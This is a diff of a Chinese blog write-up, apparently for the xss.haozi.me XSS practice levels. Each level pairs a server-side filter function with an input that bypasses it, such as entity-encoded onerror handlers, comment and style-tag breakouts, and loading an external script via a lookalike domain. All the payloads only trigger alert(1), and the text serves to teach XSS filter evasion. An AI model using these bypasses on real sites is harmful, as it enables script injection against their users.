+<h4 id="input-code-3"><a href="#input-code-3" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
+
+<h4 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>过滤了圆括号。</p>
+<p>模板字符串紧跟在函数名后面，该函数将被调用来处理这个模板字符串。</p>
+<p>模板字符串使用反引号来代替普通字符串中的双引号和单引号。</p>
+</blockquote>
+<h4 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><h4 id="server-code-4"><a href="#server-code-4" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> stripBracketsRe <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[()`]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span>
   input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripBracketsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> input
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-4"><a href="#input-code-4" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span><span class="token keyword">throw</span><span class="token string">'=alert\x281\x29'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script
+<span class="token punctuation">&#125;</span></code></pre>
+
+<h4 id="input-code-4"><a href="#input-code-4" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>window<span class="token punctuation">.</span>onerror<span class="token operator">=</span>eval<span class="token punctuation">;</span><span class="token keyword">throw</span><span class="token string">'=alert\x281\x29'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script
 <span class="token operator">&lt;</span>iframe srcdoc<span class="token operator">=</span><span class="token string">"&lt;script>parent.alert&amp;#40;1&amp;#41;&lt;/script>"</span>
-<span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token operator">&lt;</span><span class="token operator">/</span>script</code></pre><h4 id="解释-4"><a href="#解释-4" class="headerlink" title="解释"></a>解释</h4><blockquote><ul><li><p>过滤了圆括号和反引号。</p></li><li><p>“<svg>“标签中可以直接执行HTML实体字符。</svg></p></li><li><p>或者”<iframe>“标签的srcdoc里面的内容可以直接在HTML中显示出来。</iframe></p></li></ul></blockquote><h4 id="运行截图-4"><a href="#运行截图-4" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143755743.png" alt=""></h4><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><h4 id="server-code-5"><a href="#server-code-5" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/-->/g</span><span class="token punctuation">,</span> <span class="token string">'😂'</span><span class="token punctuation">)</span>
+<span class="token operator">&lt;</span>svg<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token operator">&lt;</span><span class="token operator">/</span>script</code></pre>
+
+<h4 id="解释-4"><a href="#解释-4" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<ul>
+<li><p>过滤了圆括号和反引号。</p>
+</li>
+<li><p>“<svg>“标签中可以直接执行HTML实体字符。</p>
+</li>
+<li><p>或者”<iframe>“标签的srcdoc里面的内容可以直接在HTML中显示出来。</p>
+</li>
+</ul>
+</blockquote>
+<h4 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><h4 id="server-code-5"><a href="#server-code-5" class="headerlink" title="server code"></a>server code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">render</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">--></span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'😂'</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;!-- '</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">' -->'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-5"><a href="#input-code-5" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">--</span><span class="token operator">!</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释-5"><a href="#解释-5" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将–&gt;替换成表情，并且输入的内容在注释中输出。</p><p>HTML两种注释方法： &lt;!–注释–!&gt; 这里我们可以用对称感叹号的方法注释。</p></blockquote><h4 id="运行截图-5"><a href="#运行截图-5" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143811736.png" alt=""></h4><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><h4 id="server-code-6"><a href="#server-code-6" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/auto|on.*=|>/ig</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;input value=1 </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> type="text">`</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-6"><a href="#input-code-6" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">type<span class="token operator">=</span>image src onerror
-<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><h4 id="解释-6"><a href="#解释-6" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将以anto或者on开头，并且以等号结尾的标签属性替换成_ ，这里可以用换行。</p></blockquote><h4 id="运行截图-6"><a href="#运行截图-6" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143823312.png" alt=""></h4><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><h4 id="server-code-7"><a href="#server-code-7" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> stripTagsRe <span class="token operator">=</span> <span class="token regex">/&lt;\/?[^>]+>/gi</span>
+<span class="token punctuation">&#125;</span></code></pre>
 
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>stripTagsRe<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;article></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/article>`</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code1"><a href="#input-code1" class="headerlink" title="input code1"></a>input code1</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token string">"alert(1)"</span></code></pre><h4 id="解释1"><a href="#解释1" class="headerlink" title="解释1"></a>解释1</h4><blockquote><p>将以&lt;开头 &gt;结尾，并且忽略大小写的字符替换成空。</p><p>可以利用浏览器的容错，去掉&gt;。</p></blockquote><h4 id="运行截图1"><a href="#运行截图1" class="headerlink" title="运行截图1"></a>运行截图1</h4><p><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716145851048.png" alt=""></p><h4 id="input-code2"><a href="#input-code2" class="headerlink" title="input code2"></a>input code2</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>svg<span class="token operator">/</span>onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><h4 id="解释2"><a href="#解释2" class="headerlink" title="解释2"></a>解释2</h4><h4 id="运行截图2"><a href="#运行截图2" class="headerlink" title="运行截图2"></a>运行截图2</h4><h4><a href="#" class="headerlink"></a><img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143840011.png" alt=""></h4><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><h4 id="server-code-8"><a href="#server-code-8" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  src <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;\/style>/ig</span><span class="token punctuation">,</span> <span class="token string">'/* \u574F\u4EBA */'</span><span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`
-    &lt;style>
-      </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>src<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">
-    &lt;/style>
-  `</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-7"><a href="#input-code-7" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">/</span>style <span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h4 id="解释-7"><a href="#解释-7" class="headerlink" title="解释"></a>解释</h4><blockquote><p>将替换成\u574F\u4EBA，利用换行绕过。</p></blockquote><h4 id="运行截图-7"><a href="#运行截图-7" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143856811.png" alt=""></h4><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><h4 id="server-code-9"><a href="#server-code-9" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">let</span> domainRe <span class="token operator">=</span> <span class="token regex">/^https?:\/\/www\.segmentfault\.com/</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;script src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">">&lt;/script>`</span></span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-8"><a href="#input-code-8" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token operator">/</span>" onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre><h4 id="解释-8"><a href="#解释-8" class="headerlink" title="解释"></a>解释</h4><blockquote><p>要求以<a href="https://www.segmentfault.com开头的输入，否则失败。并且输入的url在script标签的src属性里面，还需要将这个标签闭合。" target="_blank" rel="noopener">https://www.segmentfault.com开头的输入，否则失败。并且输入的url在script标签的src属性里面，还需要将这个标签闭合。</a></p></blockquote><h4 id="运行截图-8"><a href="#运行截图-8" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143911826.png" alt=""></h4><h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><h4 id="server-code-10"><a href="#server-code-10" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">function</span> <span class="token function">escapeHtml</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&amp;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token string">'/g, '</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span>'<span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/"/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span>
-            <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'&amp;#x2f'</span><span class="token punctuation">)</span>
-  <span class="token punctuation">}</span>
+<h4 id="input-code-5"><a href="#input-code-5" class="headerlink" title="input code"></a>input code</h4><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">--</span><span class="token operator">!</span><span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
 
-  <span class="token keyword">const</span> domainRe <span class="token operator">=</span> <span class="token regex">/^https?:\/\/www\.segmentfault\.com/</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span>domainRe<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;script src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token function">escapeHtml</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">">&lt;/script>`</span></span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">return</span> <span class="token string">'Invalid URL'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-9"><a href="#input-code-9" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token punctuation">.</span>wmcoder<span class="token punctuation">.</span>site<span class="token operator">/</span>j<span class="token punctuation">.</span>js</code></pre><h4 id="解释-9"><a href="#解释-9" class="headerlink" title="解释"></a>解释</h4><blockquote><p>对很多符号进行了转义，例如&amp; ‘ “ &lt; &gt; / 都转义成了html实体编码，html实体编码在html标签的属性中可以直接进行解析。并且匹配了以<a href="https://www.segmentfault.com开头的url。当我们访问" target="_blank" rel="noopener">https://www.segmentfault.com开头的url。当我们访问</a> <a href="https://www.baidu.com@www.sina.com" target="_blank" rel="noopener">https://www.baidu.com@www.sina.com</a> 的时候我们实际访问的是 <a href="https://www.sina,com。" target="_blank" rel="noopener">https://www.sina,com。</a> 所以这里我们可以用指定的url开头，但是用@符号来执行自己的js，在这个js中有弹窗的代码。</p></blockquote><h4 id="运行截图-9"><a href="#运行截图-9" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143924070.png" alt=""></h4><h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><h4 id="server-code-11"><a href="#server-code-11" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`&lt;h1></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&lt;/h1>`</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-10"><a href="#input-code-10" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"x"</span> onerror<span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span><span class="token operator">></span></code></pre><h4 id="解释-10"><a href="#解释-10" class="headerlink" title="解释"></a>解释</h4><blockquote><p>输入的内容全部变成大写。在html标签和url中不区分大小写，但是js严格区分大小写。</p><p>所以我们可以在标签的属性内用<a href="https://xss.haozi.me/j.js" target="_blank" rel="noopener">https://xss.haozi.me/j.js</a> 这里面的脚本来进行弹窗，或者是用alert(1)的时候进行编码，可以转成html编码。</p></blockquote><h4 id="运行截图-10"><a href="#运行截图-10" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143936391.png" alt=""></h4><h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><h4 id="server-code-12"><a href="#server-code-12" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/script/ig</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token string">'&lt;h1>'</span> <span class="token operator">+</span> input <span class="token operator">+</span> <span class="token string">'&lt;/h1>'</span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-11"><a href="#input-code-11" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">10</span><span class="token punctuation">;</span><span class="token operator">></span></code></pre><h4 id="解释-11"><a href="#解释-11" class="headerlink" title="解释"></a>解释</h4><blockquote><p>把script替换成空，输入全部大写。</p><p>这里我们可以不用script标签</p></blockquote><h4 id="运行截图-11"><a href="#运行截图-11" class="headerlink" title="运行截图"></a>运行截图<img src="/medias/loading.gif" data-original="https://wmcoder.oss-cn-shenzhen.aliyuncs.com/img/image-20210716143946073.png" alt=""></h4><h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><h4 id="server-code-13"><a href="#server-code-13" class="headerlink" title="server code"></a>server code</h4><pre class="language-js"><code class="language-js"><span class="token keyword">function</span> render <span class="token punctuation">(</span>input<span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  input <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">/</span>"<span class="token string">']/g, '</span>'<span class="token punctuation">)</span>
-  <span class="token keyword">return</span> <span class="token template-string"><span class="token string">`
-    &lt;script>
-          // alert('</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>input<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">')
-    &lt;/script>
-  `</span></span>
-<span class="token punctuation">}</span></code></pre><h4 id="input-code-12"><a href="#input-code-12" class="headerlink" title="input code"></a>input code</h4><pre class="language-js"><code class="language-js">'<span class="token punctuation">)</span>
+<h4 id="解释-5"><a href="#解释-5" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将–&gt;替换成表情，并且输入的内容在注释中输出。</p>
+<p>HTML两种注释方法：<!--注释-->  &lt;!–注释–!&gt;  这里我们可以用对称感叹号的方法注释。</p>
+</blockquote>
+<h4 id="运行结果-2"><a href="#运行结果-2" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><h4 id="server-code-6"><a href="#server-code-6" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  input = input.replace(/auto|on.*=|&gt;/ig, &#39;_&#39;)
+  return `&lt;input value=1 $&amp;#123;input&amp;#125; type=&quot;text&quot;&gt;`
+&amp;#125;
+</code></pre>
+<h4 id="input-code-6"><a href="#input-code-6" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">type=image src onerror
+=alert(1)
+</code></pre>
+<h4 id="解释-6"><a href="#解释-6" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将以anto或者on开头，并且以等号结尾的标签属性替换成_ ，这里可以用换行。</p>
+</blockquote>
+<h4 id="运行结果-3"><a href="#运行结果-3" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><h4 id="server-code-7"><a href="#server-code-7" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi
+
+  input = input.replace(stripTagsRe, &#39;&#39;)
+  return `&lt;article&gt;$&amp;#123;input&amp;#125;&lt;/article&gt;`
+&amp;#125;
+</code></pre>
+<h4 id="input-code1"><a href="#input-code1" class="headerlink" title="input code1"></a>input code1</h4><pre><code class="language-js">&lt;body onload=&quot;alert(1)&quot;
+</code></pre>
+<h4 id="解释1"><a href="#解释1" class="headerlink" title="解释1"></a>解释1</h4><blockquote>
+<p>将以&lt;开头 &gt;结尾，并且忽略大小写的字符替换成空。</p>
+<p>可以利用浏览器的容错，去掉&gt;。</p>
+</blockquote>
+<h4 id="运行截图1"><a href="#运行截图1" class="headerlink" title="运行截图1"></a>运行截图1</h4><h4 id="input-code2"><a href="#input-code2" class="headerlink" title="input code2"></a>input code2</h4><pre><code class="language-js">&lt;svg/onload=alert(1)
+</code></pre>
+<h4 id="解释2"><a href="#解释2" class="headerlink" title="解释2"></a>解释2</h4><h4 id="运行截图2"><a href="#运行截图2" class="headerlink" title="运行截图2"></a>运行截图2</h4><h4 id="运行结果-4"><a href="#运行结果-4" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><h4 id="server-code-8"><a href="#server-code-8" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (src) &amp;#123;
+  src = src.replace(/&lt;\/style&gt;/ig, &#39;/* \u574F\u4EBA */&#39;)
+  return `
+    &lt;style&gt;
+      $&amp;#123;src&amp;#125;
+    &lt;/style&gt;
+  `
+&amp;#125;
+</code></pre>
+<h4 id="input-code-7"><a href="#input-code-7" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<h4 id="解释-7"><a href="#解释-7" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>将</style>替换成\u574F\u4EBA，利用换行绕过。</p>
+</blockquote>
+<h4 id="运行结果-5"><a href="#运行结果-5" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><h4 id="server-code-9"><a href="#server-code-9" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  let domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) &amp;#123;
+    return `&lt;script src=&quot;$&amp;#123;input&amp;#125;&quot;&gt;&lt;/script&gt;`
+  &amp;#125;
+  return &#39;Invalid URL&#39;
+&amp;#125;
+</code></pre>
+<h4 id="input-code-8"><a href="#input-code-8" class="headerlink" title="input code"></a>input code</h4><pre><code class="language-js">https://www.segmentfault.com/&quot; onload=alert(1)&gt;
+</code></pre>
+<h4 id="解释-8"><a href="#解释-8" class="headerlink" title="解释"></a>解释</h4><blockquote>
+<p>要求以<a href="https://www.segmentfault.com开头的输入,否则失败.并且输入的url在script标签的src属性里面,还需要将这个标签闭合./" target="_blank" rel="noopener">https://www.segmentfault.com开头的输入，否则失败。并且输入的url在script标签的src属性里面，还需要将这个标签闭合。</a></p>
+</blockquote>
+<h4 id="运行结果-6"><a href="#运行结果-6" class="headerlink" title="运行结果"></a>运行结果</h4><h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><h4 id="server-code-10"><a href="#server-code-10" class="headerlink" title="server code"></a>server code</h4><pre><code class="language-js">function render (input) &amp;#123;
+  function escapeHtml(s) &amp;#123;
+    return s.replace(/&amp;/g, &#39;&amp;amp;&#39;)
+            .replace(/&#39;/g, &#39;&amp;#39;&#39;)
+            .replace(/&quot;/g, &#39;&amp;quot;&#39;)
+            .replace(/&lt;/g, &#39;&amp;lt;&#39;)
+            .replace(/&gt;/g, &#39;&amp;gt;&#39;)
+            .replace(/\//g, &#39;&amp;#x2f&#39;)
+  &amp;#125;
+
+  const domainRe = /^https?:\/\/www\.segmentfault\.com/
+  if (domainRe.test(input)) &amp;#123;
+    return `&lt;script src=&quot;$&amp;#123;escapeHtml(input)&amp;#125;&quot;&gt;&lt;/script&gt;`
+  &amp;#125;
+  return &#39;Invalid URL&#39;
+&amp;#125;
+</code></pre>
